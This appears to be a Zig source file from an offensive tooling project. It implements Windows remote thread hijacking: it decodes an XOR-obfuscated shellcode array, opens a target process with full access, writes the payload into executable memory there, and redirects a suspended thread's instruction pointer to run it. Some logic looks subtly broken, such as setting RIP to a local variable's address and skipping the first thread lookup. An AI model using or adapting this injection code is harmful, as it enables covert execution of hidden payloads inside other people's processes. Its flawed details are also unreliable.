const std = @import("std");
const lib = @import("lib");
const win = @import("win");
const logger = @import("logger");

// Key: a
pub const cipherShellcode = [_]u8{ 0x9d, 0x29, 0xe2, 0x85, 0x91, 0x89, 0xa1, 0x61, 0x61, 0x61, 0x20, 0x30, 0x20, 0x31, 0x33, 0x30, 0x37, 0x29, 0x50, 0xb3, 0x04, 0x29, 0xea, 0x33, 0x01, 0x29, 0xea, 0x33, 0x79, 0x29, 0xea, 0x33, 0x41, 0x29, 0xea, 0x13, 0x31, 0x29, 0x6e, 0xd6, 0x2b, 0x2b, 0x2c, 0x50, 0xa8, 0x29, 0x50, 0xa1, 0xcd, 0x5d, 0x00, 0x1d, 0x63, 0x4d, 0x41, 0x20, 0xa0, 0xa8, 0x6c, 0x20, 0x60, 0xa0, 0x83, 0x8c, 0x33, 0x20, 0x30, 0x29, 0xea, 0x33, 0x41, 0xea, 0x23, 0x5d, 0x29, 0x60, 0xb1, 0xea, 0xe1, 0xe9, 0x61, 0x61, 0x61, 0x29, 0xe4, 0xa1, 0x15, 0x06, 0x29, 0x60, 0xb1, 0x31, 0xea, 0x29, 0x79, 0x25, 0xea, 0x21, 0x41, 0x28, 0x60, 0xb1, 0x82, 0x37, 0x29, 0x9e, 0xa8, 0x20, 0xea, 0x55, 0xe9, 0x29, 0x60, 0xb7, 0x2c, 0x50, 0xa8, 0x29, 0x50, 0xa1, 0xcd, 0x20, 0xa0, 0xa8, 0x6c, 0x20, 0x60, 0xa0, 0x59, 0x81, 0x14, 0x90, 0x2d, 0x62, 0x2d, 0x45, 0x69, 0x24, 0x58, 0xb0, 0x14, 0xb9, 0x39, 0x25, 0xea, 0x21, 0x45, 0x28, 0x60, 0xb1, 0x07, 0x20, 0xea, 0x6d, 0x29, 0x25, 0xea, 0x21, 0x7d, 0x28, 0x60, 0xb1, 0x20, 0xea, 0x65, 0xe9, 0x29, 0x60, 0xb1, 0x20, 0x39, 0x20, 0x39, 0x3f, 0x38, 0x3b, 0x20, 0x39, 0x20, 0x38, 0x20, 0x3b, 0x29, 0xe2, 0x8d, 0x41, 0x20, 0x33, 0x9e, 0x81, 0x39, 0x20, 0x38, 0x3b, 0x29, 0xea, 0x73, 0x88, 0x36, 0x9e, 0x9e, 0x9e, 0x3c, 0x28, 0xdf, 0x16, 0x12, 0x53, 0x3e, 0x52, 0x53, 0x61, 0x61, 0x20, 0x37, 0x28, 0xe8, 0x87, 0x29, 0xe0, 0x8d, 0xc1, 0x60, 0x61, 0x61, 0x28, 0xe8, 0x84, 0x28, 0xdd, 0x63, 0x61, 0x7e, 0xf1, 0xa1, 0xc9, 0x60, 0x17, 0x20, 0x35, 0x28, 0xe8, 0x85, 0x2d, 0xe8, 0x90, 0x20, 0xdb, 0x2d, 0x16, 0x47, 0x66, 0x9e, 0xb4, 0x2d, 0xe8, 0x8b, 0x09, 0x60, 0x60, 0x61, 0x61, 0x38, 0x20, 0xdb, 0x48, 0xe1, 0x0a, 0x61, 0x9e, 0xb4, 0x31, 0x31, 0x2c, 0x50, 0xa8, 0x2c, 0x50, 0xa1, 0x29, 0x9e, 0xa1, 0x29, 0xe8, 0xa3, 0x29, 0x9e, 0xa1, 0x29, 0xe8, 0xa0, 0x20, 0xdb, 0x8b, 0x6e, 0xbe, 0x81, 0x9e, 0xb4, 0x29, 0xe8, 0xa6, 0x0b, 0x71, 0x20, 0x39, 0x2d, 0xe8, 0x83, 0x29, 0xe8, 0x98, 0x20, 0xdb, 0xf8, 0xc4, 0x15, 0x00, 0x9e, 0xb4, 0x29, 0xe0, 0xa5, 0x21, 0x63, 0x61, 0x61, 0x28, 0xd9, 0x02, 0x0c, 0x05, 0x61, 0x61, 0x61, 0x61, 0x61, 0x20, 0x31, 0x20, 0x31, 0x29, 0xe8, 0x83, 0x36, 0x36, 0x36, 0x2c, 0x50, 0xa1, 0x0b, 0x6c, 0x38, 0x20, 0x31, 0x83, 0x9d, 0x07, 0xa6, 0x25, 0x45, 0x35, 0x60, 0x60, 0x29, 0xec, 0x25, 0x45, 0x79, 0xa7, 0x61, 0x09, 0x29, 0xe8, 0x87, 0x37, 0x31, 0x20, 0x31, 0x20, 0x31, 0x20, 0x31, 0x28, 0x9e, 0xa1, 0x20, 0x31, 0x28, 0x9e, 0xa9, 0x2c, 0xe8, 0xa0, 0x2d, 0xe8, 0xa0, 0x20, 0xdb, 0x18, 0xad, 0x5e, 0xe7, 0x9e, 0xb4, 0x29, 0x50, 0xb3, 0x29, 0x9e, 0xab, 0xea, 0x6f, 0x20, 0xdb, 0x69, 0xe6, 0x7c, 0x01, 0x9e, 0xb4, 0xda, 0x91, 0xd4, 0xc3, 0x37, 0x20, 0xdb, 0xc7, 0xf4, 0xdc, 0xfc, 0x9e, 0xb4, 0x29, 0xe2, 0xa5, 0x49, 0x5d, 0x67, 0x1d, 0x6b, 0xe1, 0x9a, 0x81, 0x14, 0x64, 0xda, 0x26, 0x72, 0x13, 0x0e, 0x0b, 0x61, 0x38, 0x20, 0xe8, 0xbb, 0x9e, 0xb4 };

pub fn threadHijacking(
    pid: ?u32,
) anyerror!void {
    var targetProcess: ?*anyopaque = undefined;
    var threadEntry: win.THREADENTRY32 = undefined;
    var threadHijacked: ?win.HANDLE = undefined;
    var threadContext: win.CONTEXT = std.mem.zeroes(win.CONTEXT);
    threadContext.ContextFlags = win.CONTEXT_ALL;
    threadEntry.dwSize = @sizeOf(win.THREADENTRY32);

    const allocator = std.heap.smp_allocator;

    logger.debug("Starting thread hijacking...", .{});

    const shellcode = try lib.xorSingleBytes(allocator, &cipherShellcode, 'a');
    logger.debug("Shellcode (len: {d}):", .{shellcode.len});
    if (shellcode.len != cipherShellcode.len) {
        logger.err("Error during decrypting size not equal", .{});
        return;
    }
    defer allocator.free(shellcode);

    logger.debug("Opening process with PID: {}", .{pid.?});
    targetProcess = win.threads.OpenProcess(win.threads.PROCESS_ALL_ACCESS, win.FALSE, pid.?);
    if (targetProcess == null) {
        logger.err("Failed to handle the process by pid not found or not accesible", .{});
        return;
    }

    logger.debug("Allocating remote buffer in target process...", .{});
    const remoteBuffer = win.mem.VirtualAllocEx(targetProcess, null, shellcode.len, (win.mem.VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1, .RESERVE = 1 }), win.mem.PAGE_EXECUTE_READWRITE);
    logger.debug("Remote buffer address: {?}", .{remoteBuffer});

    logger.debug("Writing shellcode to remote process memory...", .{});
    _ = win.WriteProcessMemory(targetProcess, remoteBuffer, shellcode.ptr, shellcode.len, null);

    logger.debug("Searching for thread to hijack...", .{});
    const snapshot = win.CreateToolhelp32Snapshot(win.TH32CS_SNAPTHREAD, 0);
    if (snapshot == win.standard.INVALID_HANDLE_VALUE) {
        logger.err("CreateToolhelp32Snapshot Failed With Error: {any}", .{win.standard.GetLastError()});
        return;
    }
    defer _ = win.standard.CloseHandle(snapshot);

    var candidate_threads: [10]win.DWORD = undefined;
    var candidate_count: usize = 0;

    // Collect all threads from the target process
    while (true) {
        if (threadEntry.th32OwnerProcessID == pid and candidate_count < candidate_threads.len) {
            candidate_threads[candidate_count] = threadEntry.th32ThreadID;
            candidate_count += 1;
        }
        if (win.Thread32Next(snapshot, &threadEntry) == 0) break;
    }

    // Try to open each thread
    for (candidate_threads[0..candidate_count]) |thread_id| {
        threadHijacked = win.threads.OpenThread(win.threads.THREAD_ALL_ACCESS, 0, thread_id);
        if (threadHijacked != null) {
            logger.debug("Successfully opened thread {d}", .{thread_id});
            break;
        } else {
            logger.err("Failed to open thread {d} with error: {any}", .{ thread_id, win.standard.GetLastError() });
        }
    }

    logger.debug("Suspending target thread...", .{});
    const suspend_result = win.threads.SuspendThread(threadHijacked);
    if (suspend_result == 0xFFFFFFFF) {
        logger.err("SuspendThread Failed With Error: {d}", .{@intFromEnum(win.standard.GetLastError())});
        return;
    }

    logger.info("Getting thread context...", .{});
    if (win.GetThreadContext(threadHijacked, &threadContext) == 0) {
        logger.err("GetThreadContext Failed With Error: {d}", .{win.standard.GetLastError()});
        return;
    }

    logger.debug("Original RIP: 0x{x}", .{threadContext.Rip});
    threadContext.Rip = @intFromPtr(&remoteBuffer);
    logger.debug("Setting RIP to shellcode address: 0x{x}", .{threadContext.Rip});
    _ = win.SetThreadContext(threadHijacked, &threadContext);

    logger.debug("Resuming hijacked thread...", .{});
    _ = win.threads.ResumeThread(threadHijacked);

    logger.debug("Thread hijacking completed.", .{});

    return;
}
